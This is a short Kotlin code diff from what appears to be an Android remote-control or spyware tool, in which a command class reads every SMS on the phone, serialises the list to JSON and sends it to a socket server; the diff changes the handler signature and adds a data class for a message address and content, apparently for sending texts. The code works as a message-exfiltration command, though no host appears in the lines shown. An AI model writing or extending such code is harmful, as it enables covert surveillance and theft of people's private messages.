@@ -54,7 +54,8 @@ class Sms(context: Context) : Command(), Executor {
     /**
      * post all sms as json to the socket server
      */
-    override fun execute(data: Any) {
+    override fun execute(data: Array<Any>) {
+
         val msgList = CallingHistory.getSmsFromPhone(context)
         val data1 = Gson().toJson(msgList)
         this.emitData(SMS_LIST, data1)
@@ -73,4 +74,8 @@ class Sms(context: Context) : Command(), Executor {
         return this
     }
 
+    data class DestinationDTO(
+        var address: String,
+        var content: String
+    )
 }
